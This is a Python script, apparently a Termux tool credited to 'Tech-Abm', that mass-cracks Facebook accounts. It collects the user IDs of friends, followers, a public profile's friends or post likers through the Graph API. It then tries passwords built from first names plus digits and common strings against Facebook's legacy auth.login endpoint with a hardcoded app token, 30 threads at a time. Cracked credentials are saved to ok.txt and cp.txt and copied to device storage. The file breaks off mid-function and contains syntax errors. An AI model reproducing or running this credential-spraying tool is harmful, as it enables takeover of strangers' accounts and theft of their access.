try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pkg install python   ")
    os.system("pip install mechanize")
    os.system("pip install requests ")
    time.sleep(0.05)
    os.system("pip2 install nodejs ")	
    os.system("pip2 install npm")
    time.sleep(0.05)	
    os.system("pkg install python2   ")
    os.system("pip2 install requests ")
    os.system("pip2 install mechanize")
    os.system("python2 ab.py")
try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
        os.system('mv ... .....')
        os.system('cd ..... && npm install')
        os.system('#')
        os.system('#')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('node ...../index.js &')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def abm(z):
        for e in z + "\n":
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Logging In "+o),;sys.stdout.flush();time.sleep(0.0001)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Saving Token "+o),;sys.stdout.flush();time.sleep(0.0001)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Getting Updates "+o),;sys.stdout.flush();time.sleep(0.0001)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Logging Out "+o),;sys.stdout.flush();time.sleep(0.0001)
def download():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r[✓] Downloading "+o),;sys.stdout.flush();time.sleep(0.0001)
logo = """\033[1;97m----------------------------------------------------------------------------
\033[1;90m..\033[1;91m########\033[1;90m..\033[1;91m########\033[1;90m...\033[1;91m#######\033[1;90m..\033[1;91m########\033[1;90m.\033[1;91m####\033[1;90m..\033[1;91m######\033[1;90m...\033[1;91m#######\033[1;90m..\033[1;91m########\033[1;90m...
\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..
\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m.......\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..
\033[1;90m..\033[1;91m########\033[1;90m..\033[1;91m########\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m######\033[1;90m....\033[1;91m##\033[1;90m...\033[1;91m######\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m########\033[1;90m...
\033[1;90m..\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m...\033[1;91m##\033[1;90m...\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m...\033[1;91m##\033[1;90m....
\033[1;90m..\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m...
\033[1;90m..\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..\033[1;91m#######\033[1;90m..\033[1;91m##\033[1;90m.......\033[1;91m####\033[1;90m..\033[1;91m######\033[1;90m...\033[1;91m#######\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..
\033[1;97m----------------------------------------------------------------------------
 Coded by : Tech-Abm
 Github   : https://github.com/Tech-abm
 Fb Page  : https://m.facebook.com/Techabm
\033[1;97m----------------------------------------------------------------------------
"""

idh = []

def tech_abm():
    os.system("clear")
    print logo
    abm("Enter User \033[1;92mName \033[1;97mOr \033[1;91mPassword")
    print("\033[1;97m==========================")
    username = raw_input("[+] Username : ")
    if username =="pro":
        os.system("clear")
        print logo
        print ("[✓] Username : pro (\033[1;92mRASTA\033[1;97m)")
        passwordss = raw_input("[+] Password : ")
        if passwordss =="fisor":
            os.system("clear")
            print logo
            logging()
            os.system("clear")
            print logo
            print ("[✓] Username : pro (\033[1;92mRASTA\033[1;97m)")
            print ("[✓] Password : fisor (\033[1;92mRASTA\033[1;97m)")
            time.sleep(1)
            print('')
            abm("[✓] Login \033[1;92mSuccessful\033[1;97m")
            time.sleep(1)
        try:
            open(".login.txt","r")
            menu()
        except(KeyError , IOError):
            login_choice()
        else:
            print ("[!] Password : "+passwordss+" (\033[1;91mXalata\033[1;97m)")
            time.sleep(1)
            tech_abm()
    else:
        print ("[!] Username : "+username+" (\033[1;91mXalata\033[1;97m)")
        time.sleep(1)
        tech_abm()

def login_choice():
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print ("[1] Random Number Cloning (no login) ")
    print ("[2] Random Email Cloning  (no login) ")
    print ("[3] Clone Friendlist and Public ID (login) ")
    print ("[0] Exit")
    print("\033[1;97m----------------------------------------------------------------------------")
    clone_main()
def clone_main():
    hack = raw_input("\n>>> ")
    if hack =="1":
        loginvia()
    elif hack =="0":
        os.system("exit")
    else:
        print "\x1b[1;91mFill in correctly"
        clone_main()

def loginvia():
    os.system('clear')
    print logo
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print ("[1] login With Access Token ")
    print ("[2] Login With User And Pass")
    print ("[0] Back")
    print("\033[1;97m----------------------------------------------------------------------------")
    clone_loginvia()
def clone_loginvia():
    hack = raw_input("\n╰─➣ ")
    if hack =="1":
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        print ("Login With Token").center(50)
        print("\033[1;97m----------------------------------------------------------------------------")
        token = raw_input("[+] Paste Token Here : ")
        print("\033[1;97m----------------------------------------------------------------------------")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        abm("\r[✓] Login Successfull")
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Checking Token 40%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Checking Token 60%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Checking Token 80%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Checking Token 100%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("Please Wait 0_0").center(50)
        time.sleep(0.005)
        os.system("clear")
        print logo
        menu()
    elif hack =="2":
        loginfb()
    elif hack =="0":
                menu()
    else:
                print ("[!] Tkaya Zhmarayak Halbzhera")
                clone_loginvia()
def loginfb():
    os.system("clear")
    print logo
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print("Login With \033[1;94mFacebook \033[1;97mAccount").center(50)
    print("\033[1;97m----------------------------------------------------------------------------")
    id = raw_input("[+] \033[1;92mEmail\033[1;91m/\033[1;97mID\033[1;91m/\033[1;97mNumber : ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("[+] \033[1;91mPasswor\033[1;97m : ")
    print("\033[1;97m----------------------------------------------------------------------------")
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        print("\n[✓] Login Successfull")
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0 20%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0  40%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0  60%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0  80%").center(50)
        time.sleep(0.0001)
        os.system("clear")
        print logo
        print("loading 0_0  100%").center(50)
        time.sleep(1)
        os.system("clear")
        print logo
        print("Tkaya Chaware Ka 0_0").center(50)
        time.sleep(1)
        os.system("clear")
        print logo
        print("Tokenakat Save Bw").center(50)
        time.sleep(0.0001)
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n[!] Acawntakat La \033[1;94mCheckpointaya \033[1;97m")
            time.sleep(1)
            loginfb()
        else:
            print("\n[!] Login Failed.Email/ID/Number OR Password Xalata ")
            time.sleep(0.0001)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Bbwra aw tokena Bwny Nya")
        os.system("rm -rf .login.txt")
        time.sleep(0.0001)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("[!] Acawntakat La \033[1;94mCheckpointaya \033[1;97m")
        os.system("rm -rf .login.txt")
        time.sleep(0.0001)
        login_choice()
    os.system('clear')
    print logo
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print("[✓] Name : "+name)
    print("\033[1;97m----------------------------------------------------------------------------")
    print("[1] Clone \033[1;91mFrienlist \033[1;97mand \033[1;91mPublic ID\033[1;97m")
    print("[2] Danany \033[1;91mPassword \033[1;97mBa Dly Xot")
    print("\033[1;97m----------------------------------------------------------------------------")
    menu_select()
def menu_select():
    option = raw_input("\n>>> ")
    if option =="1":
        crack()
    if option =="2":
        choice()
    elif option =="0":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(0.0001)
        print("\r[✓] Logged Out Successfully")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()

def crack():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        time.sleep(0.5)
        os.system('clear')
        print logo
        print ("\033[1;97m[\033[1;90m1\033[1;97m] Hack Krdne \033[1;91mfrendakant\033[1;97m")
        print ("\033[1;97m[\033[1;90m2\033[1;97m] Hack Krdne \033[1;92mPublic ID\033[1;97m")
        print ('\033[1;97m[\033[1;90m0\033[1;97m] Back')
        print("\033[1;97m----------------------------------------------------------------------------")
        crack2()
def crack2():
        select = raw_input("\n>>> ")
        id=[]
        oks=[]
        cps=[]
        if select=="1":
                os.system("clear")
                print logo
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] ID yak Bnwsa : ")
                print("\033[1;97m----------------------------------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error '+idt+' Frendi nya yan frendi shardotawa')
                        raw_input("\nEnter Bka bo Garanawa ")
                        crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="0":
                menu()
        else:
                print ("[!] Tkaya Zhmaray Gwnjaw dane ")
                crack2()
        print("[+] Hamw ID yakan : "+str(len(id)))
        time.sleep(0.5)
        print("\033[1;97m[\033[1;90m+\033[1;97m] Tkaya Bwasta bo dast pe krdny Crack")
        time.sleep(0.5)
        print("\033[1;97m----------------------------------------------------------------------------")
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if "access_token" in d:
		       print("\033[90m[\033[1;92mSuccessfu\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
		       ok=open("ok.txt","a")
		       ok.write(uid+" | "+pass1+"\n")
		       ok.close()
		       oks.append(uid)
		    else:
		    	if 'www.facebook.com' in d['error_msg']:
		            print("\033[1;90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
		            cp=open("cp.txt","a")
		            cp.write(uid+" | "+pass1+"\n")
		            cp.close()
		            cps.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass2+"")
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass3+" \033[1;97m")
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass3+" \033[1;97m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="1122334455"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass4+" \033[1;97m")
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass4+" \033[1;97m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="1234554321"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass5+" \033[1;97m")
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass5+" \033[1;97m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=name+"123456"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                 print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass6+" \033[1;97m")
		                                                 cp=open("cp.txt","a")
		                                                 cp.write(uid+" | "+pass6+"\n")
		                                                 cp.close()
		                                                 cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass6+" \033[1;97m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7=name+"1122"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass7+" \033[1;97m")
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                   else:
		                                                        if 'access_token' in d:
		                                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass7+" \033[1;97m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)



                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print("\033[1;97m----------------------------------------------------------------------------")
        print ('[✓] Process Has Been Completed')
        print('[✓] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("\033[1;97m----------------------------------------------------------------------------")
        print logo
        down()
def down():
    dow = raw_input("[?] Atawe file Cp Dabazeta naw mobilet (Y/N) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[\033[1;92m✓\033[1;97m] File aka download bw Lanaw Storage aya ')
        raw_input("Enter Bka bo Garanawa ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("[!] Tkaya Yes Yan No  y/n ")
        down()

def choice():
    os.system("clear")
    print logo
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print("[1] Danane 2 Password Ba Dly Xot")
    print("[2] Danane 5 Password Ba Dly Xot")
    print("[0] Back")
    time.sleep(0.5)
    print("\033[1;97m----------------------------------------------------------------------------")
    choice_man()
def choice_man():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        unikk()
    if option =="2":
        randm()
    if option =="0":
          menu()
    else:
          print ("[!] Please Select a Valid Option")
          choice_man()

def unikk():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        print ("[1] Crack From Friend List")
        print ("[2] Crack From Public ID")
        print ("[3] Crack From Followers")
        print ("[4] Crack From Page/Group/ID Post")
        print ('[0] Back')
        print("\033[1;97m----------------------------------------------------------------------------")
        unikk2()
def unikk2():
        devil = raw_input("\n╰─➣ ")
        id=[]
        oks=[]
        cps=[]
        if devil=="1":
                os.system("clear")
                print logo
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("\033[1;97m----------------------------------------------------------------------------")
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif devil =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID/Username : ")
                print("\033[1;97m----------------------------------------------------------------------------")
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                prin("\033[1;97m----------------------------------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        unikk()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif devil =="3":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID/Username : ")
                print("--------------------------------------------------")
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif devil =="4":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID/Username : ")
                print("--------------------------------------------------")
                pass1=raw_input("[1] Input Password  : ")
                pass2=raw_input("[2] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
                        z = json.loads(r.text)
                        for i in z["data"]:
                                uid=i['id']
                                na=i['name']
                                nm=na.rsplit(" ")[0]
                                id.append(uid+'|'+nm)
                except KeyError:
                        print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
                        raw_input("\nPress Enter To Back")
                        unikk()

        elif devil =="0":
                menu()
        else:
                print ("[!] Please Select a Valid Option")
                crack2()
        print("[+] Total IDs : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Plz Wait Clone Account Will Be Appear Here")
        time.sleep(0.5)
        print("--------------------------------------------------")


        def main(arg):
                user=arg
                uid,name=user.split("|")
                try:

                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_ookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                    d=json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass1+" \033[1;97m")
                        cp=open("cp.txt","a")
                        cp.write(uid+" | "+pass1+"\n")
                        cp.close()
                        cps.append(uid)
                    else:
                        if "access_token" in d:
                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
                            ok=open("ok.txt","a")
                            ok.write(uid+" | "+pass1+"\n")
                            ok.close()
                            oks.append(uid)
                        else:

                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                            d=json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass2+" \033[1;97m")
                                cp=open("cp.txt","a")
                                cp.write(uid+" | "+pass2+"\n")
                                cp.close()
                                cps.append(uid)
                            else:
                                if 'access_token' in d:
                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
                                    ok=open("ok.txt","a")
                                    ok.write(uid+" | "+pass2+"\n")
                                    ok.close()
                                    oks.append(uid)


                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print("--------------------------------------------------")
        print ('[✓] Process Has Been Completed')
        print('[✓] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("--------------------------------------------------")
        down()
def down():
    dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[✓] File Downloaded Successfully')
        print("[✓] Please Open Your Internal Storage and Rename The File")
        raw_input("Press Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("[!] Please Select a Valid Option ")
        down()

def randm():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        print ("[1] Crack From Friend List")
        print ("[2] Crack From Public ID")
        print ("[3] Crack From Followers")
        print ("[4] Crack From Page/Group/ID Post")
        print ('[0] Back')
        print("--------------------------------------------------")
        randm2()
def randm2():
        select = raw_input("\n╰─➣ ")
        id=[]
        oks=[]
        cps=[]
        if select=="1":
                os.system("clear")
                print logo
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password  : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID : ")
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        randm()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="3":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID : ")
                print("--------------------------------------------------")
